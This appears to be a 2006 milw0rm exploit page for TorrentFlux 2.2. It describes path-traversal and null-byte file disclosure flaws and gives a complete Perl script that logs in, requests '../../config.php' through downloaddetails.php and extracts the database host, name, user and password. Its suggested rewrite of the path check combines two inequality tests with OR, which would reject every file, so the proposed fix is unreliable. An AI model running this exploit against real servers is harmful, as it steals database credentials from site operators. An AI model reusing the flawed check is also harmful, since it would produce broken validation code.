<html><head><title>TorrentFlux 2.2 (downloaddetails.php) Local File Disclosure Exploit</title></head><pre>#Description: 

#TorrentFlux fails to sanitise the variable &quot;alias&quot; in downloaddetails.php. This allows an 
#attacker to include any file they want; the contents is displayed at in the spaces provided
#and the remaning data is displayed as error messages on the page. Overall Torrentflux makes it
#look quite nice. Solution use SecurityClean() of viewnfo.php to solve the problem. 

# Note: After just looking at the code for viewnfo.php of TorrentFlux 2.1, it would seem that
# it is possible to also read the config.php file in the same way, since path was not sanitised. 
# Although they have fixed this problem in 2.2 with a function i demonstrated to the 
# developer for a previous vulnerability. Exploit: viewnfo.php?path=../config.php

# Just a thought, SecurityCleanPath() could look a bit nicer like so: 
# From: 
#if( (strtolower( substr( $string, -4 ) ) == &quot;.txt&quot;) || (strtolower( substr( $string, -4 ) ) == &quot;.nfo&quot;) )
#    {
#        // we are good
#    }
#    else
#    {
#        AuditAction($cfg[&quot;constants&quot;][&quot;error&quot;], &quot;Not a text or NFO: &quot; . $string);
#        die(&quot;Invalid file specified.  Action has been logged.&quot;);
#    }

#To: 
#if( (strtolower( substr( $string, -4 ) ) != &quot;.txt&quot;) || (strtolower( substr( $string, -4 ) ) != &quot;.nfo&quot;) )
#{
#	AuditAction($cfg[&quot;constants&quot;][&quot;error&quot;], &quot;Not a text or NFO: &quot; . $string);
#	die(&quot;Invalid file specified.  Action has been logged.&quot;);
#}
# And it would seem for some reason if you do you change the above code it prevents you from 
# using a null character to access any file in the current or above directory. 2.2 is 
# vulnerable to this. EG: viewnfo.php?path=../config.php%00.txt (but since you cant go back
# a directory it doesn't help much - and you are stuck in the downloads, or above directories). 

# r0ut3r (writ3r [at] gmail.com)

#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                   TorrentFlux 2.2 Database Credentials Exposure Exploit                       #
#################################################################################################
# Software: TorrentFlux 2.2                                                                     #
#                                                                                               #
# Vendor: http://www.torrentflux.com/                                                           #
#                                                                                               #
# Released: 2006/12/09                                                                          #
#                                                                                               #
# Discovered &amp; Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
#                                                                                               #
# Note from a developer: &quot;Valid TorrentFlux user IDs are REQUIRED and this is NOT an open       #
# vulnerability to a NON user&quot;.                                                                 #
#                                                                                               #
# Note: The information provided in this document is for TorrentFlux administrator              #
# testing purposes only! This vulnerability requires a user account.                            #
#                                                                                               #
# Apart from a few problems (which are fixed) TorrentFlux is a great torrent client.            #
# Download it at: http://www.torrentflux.com/                                                   #
#################################################################################################

use IO::Socket;

$port = &quot;80&quot;; # connection port
$target = @ARGV[0]; # torrentflux.com
$folder = @ARGV[1]; # /torrentflux/
$user = @ARGV[2]; # login username
$pass = @ARGV[3]; # login password

sub Header()
{
	print q
	{#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                   TorrentFlux 2.2 Database Credentials Exposure Exploit                       #
#################################################################################################
};
}

sub Usage()
{
	print q
	{
Usage: db_tf2.pl [target] [directory] [username] [password]
Example: db_tf2.pl torrentflux.com /torrentflux/ r0ut3r testing123 
};
	exit();
}

Header();

if (!$target || !$folder || !$user || !$pass) {
	Usage(); }

print &quot;\n[+] Connecting...\r\n&quot;;
$sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[-] Failed to connect. Exiting...\r\n&quot;;
print &quot;[+] Attempting to login\n&quot;;
print $sock &quot;GET &quot;.$folder.&quot;login.php?username=$user&amp;iamhim=$pass HTTP/1.1\n&quot;;
print $sock &quot;Host: $target\n&quot;;
print $sock &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
print $sock &quot;Accept: text/html\n&quot;;
print $sock &quot;Connection: keep-alive\n\n\r\n&quot;;

while (&lt;$sock&gt;)
{
        if (/Cookie: TorrentFlux=(.*?);/)
        {
                $cookie = &quot;TorrentFlux=$1&quot;;
        }
}

print &quot;[+] Successfully logged in\n&quot;;
print &quot;[+] Cookie: &quot;.$cookie.&quot;\n&quot;;
if ($cookie eq &quot;&quot;)
{
        print &quot;[-] Failed to login. Exiting...&quot;;
	exit();
}

print &quot;[+] Sending request\n&quot;;

$xpack = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[-] Failed to connect on exploit attempt. Exiting...\r\n&quot;;
print $xpack &quot;GET &quot;.$folder.&quot;downloaddetails.php?alias=../../config.php HTTP/1.1\n&quot;;
print $xpack &quot;Host: $target\n&quot;;
print $xpack &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
print $xpack &quot;Accept: text/html\n&quot;;
print $xpack &quot;Cookie: &quot;.$cookie.&quot;\n&quot;;
print $xpack &quot;Connection: keep-alive\n\n&quot;;
print &quot;\n---------- Exploit Results ----------\n\n&quot;; 

while (&lt;$xpack&gt;)
{
	if (/db_type&quot;] = &quot;(.*?)&quot;;/) {
		print &quot;Type: $1\n&quot;; }
	if (/db_host&quot;] = &quot;(.*?)&quot;;/) {
		print &quot;Host: $1\n&quot;; }
	if (/db_name&quot;] = &quot;(.*?)&quot;;/) {
		print &quot;Name: $1\n&quot;; }
	if (/db_user&quot;] = &quot;(.*?)&quot;;/) {
		print &quot;User: $1\n&quot;; }
	if (/db_pass&quot;] = &quot;(.*?)&quot;;/) {
		print &quot;Pass: $1\n\n&quot;; 
		$res = true; }
}
if ($res eq false) {
	print &quot;[-] Exploit failed - Not vulnerable\n&quot;; }

print &quot;[!] Connection to host lost...\n&quot;;

#################################################################################################
#               This has been another r0ut3r discovery - writ3r [at] gmail.com                  #
#################################################################################################

# milw0rm.com [2006-12-09]</pre></html>